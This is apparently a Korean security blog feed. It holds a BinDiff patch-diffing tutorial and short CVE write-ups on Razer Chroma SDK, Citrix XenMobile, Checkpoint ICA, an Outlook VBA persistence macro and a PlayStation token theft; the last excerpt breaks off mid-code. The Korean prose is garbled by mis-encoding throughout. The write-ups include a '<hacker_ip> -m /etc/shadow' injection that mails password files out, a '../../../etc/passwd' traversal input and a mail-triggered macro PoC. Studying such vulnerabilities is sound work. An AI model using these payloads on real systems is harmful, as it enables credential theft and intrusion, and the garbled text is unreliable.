toolê³¼ ë¶„ì„ ë°©ë²•ì…ë‹ˆë‹¤.</p><p>Diffingì€ IDAì—ì„œ ì§„í–‰í•˜ë©° BinDiffë¼ëŠ” í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.  BinDiffëŠ” ë¬´ë£Œë¡œ ë°°í¬ë˜ëŠ” ì½”ë“œ ë¶„ì„ IDA í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤. ìœ ëª…í•œ ë§Œí¼ ì„±ëŠ¥ í•˜ë‚˜ëŠ” í™•ì‹¤í•œ ì¹œêµ¬ì£ ?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiffëŠ” ì•„ë˜ ë§í¬ì—ì„œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)ì—ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.</p></blockquote><p>IDAê°€ ì„¤ì¹˜ëœ ê²½ë¡œë¥¼ ì…ë ¥í•˜ê³  ì„¤ì¹˜í•˜ë©´ ë˜ë©° ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ê°€ ë˜ì—ˆë‹¤ë©´ IDAì˜ Edit â†’ Pluginsì—ì„œ BinDiffë¥¼ ë³´ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìš°ì„  1016, 1082ë¥¼ ê°ê° ì„ ì—´ê³  Editâ†’Pluginsâ†’BinExport10ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>ê·¸ë¦¬ê³  BinExport v2 Binary Exportë¡œ ê°ê° Export í•´ì£¼ë©´ ì¤€ë¹„ëŠ” ë!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>ì´ì œ BinDiffë¥¼ ì‹¤í–‰í•´ì„œ Workspaceë¥¼ ë§Œë“¤ê³  Diffâ†’New Diffì—ì„œ Export í•œ ë‘ ë°”ì´ë„ˆë¦¬ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Exportí•œ íŒŒì¼ì„ ì„ íƒí•˜ê³  Diffí•˜ë©´..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>ì´ë ‡ê²Œ Overviewë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. SimilarityëŠ” ìœ ì‚¬ë„ë¥¼ ë‚˜íƒ€ë‚´ëŠ”ë°, 1ì— ê°€ê¹Œìš¸ìˆ˜ë¡ ì°¨ì´ê°€ ì—†ë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.</p></br><p>ì•„ë˜ë¡œ ë‚´ë ¤ë³´ë©´ Similarityê°€ ë‚®ì€ í•­ëª©ì„ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì´ ì¤‘ í•œ í•­ëª©ì„ ìš°í´ë¦­â†’Open Flow Graphë¥¼ ì‹¤í–‰í•˜ë©´</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>ì´ë ‡ê²Œ ê·¸ë˜í”„ë¡œ ë³´ì—¬ì¤ë‹ˆë‹¤.  ê° ë…¸ë“œ ìƒ‰ë³„ ì˜ë¯¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>ì´ˆë¡ìƒ‰ - ë³€ê²½ì  ì—†ìŒ</p><p>ë…¸ë€ìƒ‰ - ë³€ê²½ì  ìˆìŒ</p><p>ë¹¨ê°„ìƒ‰  - íŒ¨ì¹˜ì— ì˜í•´ ì œê±°ë¨</p><p>íšŒìƒ‰ - íŒ¨ì¹˜ì— ì˜í•´ ì¶”ê°€ë¨</p><p>ì¢€ ë” ìì„¸íˆ ë³¼ê¹Œìš”? ë³´ë ¤ëŠ” ë…¸ë“œë¥¼ ì„ íƒí•´ë³´ê² ìŠµë‹ˆë‹¤.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>ì´ë ‡ê²Œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œê¹Œì§€ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ë°©ì‹ìœ¼ë¡œ ë³€ê²½ì ì„ íŠ¸ë ˆì´ì‹±í•˜ë©´ ì–´ë–¤ ë¶€ë¶„ì´ íŒ¨ì¹˜ë˜ì—ˆëŠ”ì§€ ìì„¸íˆ ë³¼ ìˆ˜ ìˆê² ì£ !</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°.."></a>ë§ˆì¹˜ë©°..</h1><p>íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ì–´ ë’€ìœ¼ë‹ˆ ì›ë°ì´ ë¶„ì„í•  ë•Œ ìœ ìš©í•˜ê²Œ ì“¸ ìˆ˜ ìˆì„ ê²ƒ ê°™ë„¤ìš” ã…ã… ì´ì œ ì·¨ì•½ì .. ì·¨ì•½ì ë§Œ ì°¾ìœ¼ë©´ ë˜ëŠ”ë°â€¦.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>ì•„ë§ˆ ì•ˆë ê±°ì•¼..</p></blockquote><p>ë‹¤ìŒì—” ë‹¤ë¥¸ ì£¼ì œë¡œ ì°¾ì•„ì˜¤ê² ìŠµë‹ˆë‹¤. ì¡°ê¸ˆë§Œ ë†€êµ¬ìš” ã… (<em>ë§í•  ì½”ë¡œë‚˜ ì–¼ë¥¸ êº¼ì ¸ì¤¬ìœ¼ë©´ ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer ChromaëŠ” Razerì‚¬ì˜ ê²Œì´ë°ìš© ì»´í“¨í„° ì£¼ë³€ê¸°ê¸°ë“¤ì˜ RGB íš¨ê³¼ë¥¼ ì œì–´í•˜ëŠ” í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ Razer synapse ì„¤ì¹˜ ì‹œ ìë™ìœ¼ë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤. SDKê°€ ì¡´ì¬í•´ì„œ third partyê°€ Razer Chromaì™€ ì—°ë™ë˜ëŠ” ê¸°ëŠ¥ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì˜ˆ ) Razer ì œí’ˆê³¼ RGBíš¨ê³¼ë¥¼ ë™ê¸°í™”í•˜ëŠ” ì¼€ì´ìŠ¤, ìŒì•…ì— ë§ì¶° Razer ì œí’ˆì˜ RGBë¥¼ ë³€í™”ì‹œí‚¤ëŠ” ìŒì•… ìŠ¤íŠ¸ë¦¬ë° ì„œë¹„ìŠ¤ </p><p>Razer Chroma SDK Rest serverëŠ” Razer Chromaë¥¼ ì‚¬ìš©í•˜ëŠ” ì»´í“¨í„°ì—ì„œ ë™ì‘í•˜ê³  ìˆìœ¼ë©° ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì™€ bind í•´ 54236ë²ˆ í¬íŠ¸ë¡œ listen í•©ë‹ˆë‹¤. <code>http://localhost:54235/razer/chromasdk</code> í˜¹ì€<code> https://chromasdk.io:54236/razer/chromasdk</code> URIë¡œ App infoë¥¼ ë‹´ì€ POST requestë¥¼ ë°›ìœ¼ë©´ ê·¸ App infoì— ë”°ë¼ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>ì— ì‹¤í–‰íŒŒì¼ì„ ìƒì„±í•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p>ëª‡ ê°€ì§€ ì´ìŠˆë¡œ ì¸í•´ race-conditionì„ ì´ìš©í•œ arbitrary code executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li><p>í•´ì»¤ëŠ” Razer Chroma SDK Rest serverê°€ ë™ì‘í•˜ëŠ” ì»´í“¨í„°(ì´í•˜ victim)ì˜ IPì£¼ì†Œë§Œ ì•Œë©´ ì›ê²©ìœ¼ë¡œ POST requestë¥¼ ë³´ë‚´ ì„ì˜ì˜ íŒŒì¼ëª…ì„ ê°–ëŠ” ì‹¤í–‰íŒŒì¼ì„ victimì— ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST requestë¥¼ ë°›ì•„ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>ì— ìƒì„±í•œ ì‹¤í–‰íŒŒì¼ì€ Adminê¶Œí•œì´ ìˆëŠ” ìœ ì €ë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>í´ë”ëŠ” Admin ê¶Œí•œì´ ì—†ì–´ë„ ìˆ˜ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ol><ol start="3"><li>POST requestë¡œ ìƒì„±í•  ì‹¤í–‰íŒŒì¼(test.exe)ê³¼ ë™ì¼í•œ ì´ë¦„ì˜ íŒŒì¼ì´ ì´ë¯¸ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>í´ë” ì•ˆì— ì¡´ì¬í•˜ë©´ Razer Chroma SDK Rest serverëŠ” ê¸°ì¡´ íŒŒì¼ì˜ ë‚´ìš©ì„ ë®ì–´ì”ë‹ˆë‹¤. í•˜ì§€ë§Œ ê·¸ ì‹¤í–‰íŒŒì¼ì˜ ê¶Œí•œì€ ê·¸ íŒŒì¼ì´ ì‹¤í–‰ë˜ê¸° ì „ê¹Œì§„ ìˆ˜ì •í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ, í•´ì»¤ëŠ” race-conditionìœ¼ë¡œ test.exeì˜ ë‚´ìš©ì„ ìˆ˜ì •í•´  arbitrary code executionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>toctou</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì¡°ì§ êµ¬ì„±ì›ë“¤ì˜ ëª¨ë°”ì¼ ë””ë°”ì´ìŠ¤ ë° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê´€ë¦¬í•˜ëŠ” Endpoint Management ì†”ë£¨ì…˜ì¸ XenMobileì—ì„œ path traversalë¡œ ê¶Œí•œì´ ì—†ëŠ” ì‚¬ìš©ìê°€ íŒ¨ìŠ¤ì›Œë“œë¥¼ í¬í•¨í•œ ì„ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆê³ , ì•”í˜¸í™”ëœ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë³µí˜¸í™” í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>help-sb-download.jsp</code> ì— ì¡´ì¬í•˜ëŠ” ì·¨ì•½í•œ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>ë§¤ê°œë³€ìˆ˜ë¡œ ë°›ëŠ” <code>sbFileName</code>ì€ <code>sbFilePath</code>ì˜ <code>/op/sas/support/</code> ë’¤ì— ì—°ê²°ë˜ê³  File í´ë˜ìŠ¤ ìƒì„±ìì˜ ì¸ìˆ˜ê°€ ë©ë‹ˆë‹¤. <code>sbFileName</code>ì— <code>../../../etc/passwd</code>ë¥¼ ì „ë‹¬í•˜ë©´ <code>/etc/passwd</code>ì˜ ë‚´ìš©ì„ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ ì´ìš©í•´ ì•”í˜¸í™”ëœ íŒ¨ìŠ¤ì›Œë“œì˜ ë³µí˜¸í™”ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. íŒ¨ìŠ¤ì›Œë“œ ì•”í˜¸í™”ëŠ” <code>/opt/sas/sw/lib/libsecure.so</code> ì™€ <code>DataSecurity.jar</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì´ë£¨ì–´ì§€ë©°  <code>/opt/sas/rt/keys/security.properties</code>ì—ëŠ” ì•”í˜¸í™” í‚¤ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. í•´ì»¤ê°€ path traversal ì·¨ì•½ì ì„ ì•…ìš©í•´ ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ keyë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ë¡œì»¬ í™˜ê²½ì—ì„œ ì•”í˜¸í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ import í•´ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ <code>help-sb-download.jsp</code> íŒŒì¼ì„ ì œê±°í•˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary file download</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-6020: Checkpoint ICA Management Toolì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì  2ê°€ì§€</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Managementì˜ ICA(Internal Certificate Authority) Management Toolì—ì„œ Argument Injectionê³¼ Denial of Service ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ICA Management Toolì€ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ìˆìœ¼ë©° <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>ë¡œ í™œì„±í™”í•  ìˆ˜ ìˆìœ¼ë©° ì„¤ì •ì´ í™œì„±í™”ë˜ë©´ http://<smartcenter_ip>:18265/ë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>cpca_client set_mgmt_tool on -no_ssl</code>ì„ í†µí•´ í™œì„±í™”í•  ì‹œ ì¸ì¦ ì—†ì´ í•´ë‹¹ ì„œë¹„ìŠ¤ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë©° Manage Certificatesì— ì ‘ì†í–ˆì„ ë•Œ ê´€ë¦¬ìì¸ì§€ ë³„ë„ì˜ í™•ì¸ì„ ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p>ICA Management Toolì—ì„œ ë©”ì¼ì„ ë³´ë‚´ëŠ” í”„ë¡œì„¸ìŠ¤ì¸ cpcaëŠ” sendmail ë°”ì´ë„ˆë¦¬ë¥¼ í†µí•˜ì—¬ ë©”ì¼ì„ ì „ì†¡í•©ë‹ˆë‹¤. sendmailì€ íŒŒì¼ ì „ì†¡ ê¸°ëŠ¥ì„ ì§€ì›í•˜ì§€ë§Œ ë©”ì¼ì„ ë³´ë‚¼ ë•Œ ëˆ„ê°€ ë³´ë‚´ëŠ”ì§€ í™•ì¸ì„ í•˜ì§€ ì•Šìœ¼ë©° ìµœê³  ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ë¯€ë¡œ ëª¨ë“  íŒŒì¼ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì¸ìë¡œ íŒŒì¼ ì´ë¦„ì„ ë„˜ê²¨ì£¼ë©´ í•´ì»¤ì˜ ë©”ì¼ ì„œë²„ë¡œ íŒŒì¼ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>í•´ì»¤ê°€ netcat ë“±ì„ í†µí•´ ì„œë²„ë¥¼ ì—° í›„ Configure the CAì˜ â€œManagement Tool mail serverâ€ì— <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>ë¥¼ ì…ë ¥í•˜ë©´ í•´ì»¤ì˜ ë©”ì¼ ì„œë²„ì— <code>/etc/shadow</code> íŒŒì¼ ë‚´ìš©ì´ ë©”ì¼ í˜•ì‹ìœ¼ë¡œ ë‚ ì•„ì˜¤ê²Œ ë©ë‹ˆë‹¤.</p><p>Denial of Serviceì˜ ê²½ìš° ì…ë ¥ ê°’ì— ëŒ€í•œ ìœ íš¨ì„± ê²€ì‚¬ ì‹¤íŒ¨ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤. ì›ê²© í´ë¼ì´ì–¸íŠ¸ê°€ ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ìœ¼ë¡œ POST requestë¥¼ ë³´ë‚¼ ê²½ìš° í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë©ë‹ˆë‹¤.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlookì€ Microsoft Officeì˜ ì´ë©”ì¼ í´ë¼ì´ì–¸íŠ¸ë¡œ ì¼ì • ê´€ë¦¬, ì—°ë½ì²˜ ê´€ë¦¬, ì¼ì§€ ë“±ì˜ ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê·¸ì¤‘ ë‹¤ë¥¸ Office ì œí’ˆë“¤ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ Outlookì€ VBA(Visaul Basic for Application) ê¸°ë°˜ ë§¤í¬ë¡œë¥¼ ë§Œë“¤ì–´ ì‚¬ìš©í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆê³ , í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ persistence accessë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Persistence accessë€ í•´ì»¤ê°€ victimì— initial accessë¥¼ íšë“í•œ ì´í›„ì—ë„ ì§€ì†ì ìœ¼ë¡œ access í•  ìˆ˜ ìˆëŠ” ìƒíƒœì…ë‹ˆë‹¤. íŠ¹ì • ì œëª©ì˜ ì´ë©”ì¼ì´ ë„ì°©í•˜ë©´ íŠ¸ë¦¬ê±° ë˜ëŠ” ì•…ì„± ë§¤í¬ë¡œë¥¼ victimì— ì‹¬ì–´ë†“ìœ¼ë©´ í•´ì»¤ëŠ” ë‹¨ìˆœíˆ ì´ë©”ì¼ì„ ë³´ë‚´ëŠ” ê²ƒë§Œìœ¼ë¡œ ì›ê²© ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option ExplicitPrivate WithEvents olInboxItems As ItemsPrivate Sub Application_Startup()    Set olInboxItems &#x3D; Session.GetDefaultFolder(olFolderInbox).ItemsEnd SubPrivate Sub olInboxItems_ItemAdd(ByVal Item As Object)    On Error Resume Next    Dim olMailItem As MailItem    If TypeOf Item Is MailItem Then       If InStr(olMailItem.Subject, &quot;MDSec&quot;) &gt; 0 Then            MsgBox &quot;Hack The Planet&quot;            Shell &quot;calc.exe&quot;            olMailItem.Delete        End If    End If    Set Item &#x3D; Nothing    Set olMailItem &#x3D; NothingEnd Sub</code></pre><p>ìœ„ POC ì½”ë“œëŠ” calc.exeë¥¼ ì‹¤í–‰í•˜ëŠ” VBA ë§¤í¬ë¡œì…ë‹ˆë‹¤. ìš°ì„  Outlookì´ ì‹¤í–‰ëì„ ë•Œì˜ ìˆ˜ì‹  ë©”ì¼í•¨ ìƒíƒœë¥¼ ì €ì¥í•©ë‹ˆë‹¤. ì´í›„ì— ìƒˆë¡œìš´ ì´ë©”ì¼ì´ ì¶”ê°€ë˜ë©´ ê·¸ ì´ë©”ì¼ì˜ ì œëª©ì„ í™•ì¸í•˜ê³ , ë§Œì•½ ê·¸ ì œëª©ì´ â€œMDSecâ€ì´ë¼ë©´ calc.exeë¥¼ ì‹¤í–‰í•œ í›„ í•´ë‹¹ ì´ë©”ì¼ì„ ì‚­ì œí•©ë‹ˆë‹¤.</p><p>ì´ë©”ì¼ì˜ ì œëª©ë¿ë§Œ ì•„ë‹ˆë¼ ë°œì‹  ì£¼ì†Œ í˜¹ì€ ë‚´ìš© ë“±ìœ¼ë¡œ ë§¤í¬ë¡œì˜ íŠ¸ë¦¬ê±° ì¡°ê±´ì„ ë‹¤ì–‘í•˜ê²Œ ì„¤ì •í•  ìˆ˜ ìˆê³ , calc.exe ëŒ€ì‹  ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì‹¤í–‰í•˜ë©´ í•´ì»¤ê°€ ì›ê²© ì œì–´ë¥¼ í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>outlook</tag>
      
      <tag>email</tag>
      
      <tag>persistence access</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Access token stealing in playstation</title>
    <link href="/2020/11/24/l0ch/2020-11-24/"/>
    <url>/2020/11/24/l0ch/2020-11-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a href="https://my.playstation.com/">https://my.playstation.com</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì½˜ì†” ê²Œì„ê¸°ê¸°ì¸ PlayStationì˜ ì»¤ë®¤ë‹ˆí‹° <a href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> ì—ì„œ ë¡œê·¸ì¸ëœ ì‚¬ìš©ìì˜ Access Tokenì„ íƒˆì·¨í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><a href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> í˜ì´ì§€ëŠ” ë°œê¸‰ ì„œë²„ì—ì„œ í´ë¼ì´ì–¸íŠ¸ë¡œ OAuth ì•¡ì„¸ìŠ¤ í† í°ì„ ì „ì†¡í•˜ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í˜¸ìŠ¤íŒ… í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = a.hash.substr(<span class="hljs-number">1</span>),        c = a.search.substr(<span class="hljs-number">1</span>),        d = b + <span class="hljs-string">&quot;&amp;&quot;</span> + c,        e = convertToObject(d);    <span class="hljs-keyword">return</span> e.refererURL = a.toString(), e&#125;....<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendResponseToApp</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">var</span> b = extractFrameTypeFromRequestID(a.requestID),        c = a.targetOrigin || getOrigin(),        d = a.baseUrl || <span class="hljs-string">&quot;&quot;</span>,        e = a.returnRoute || <span class="hljs-string">&quot;&quot;</span>,        f = a.excludeQueryParams,        g = !f &amp;&amp; <span class="hljs-built_in">window</span>.location.search || <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">switch</span> (b) 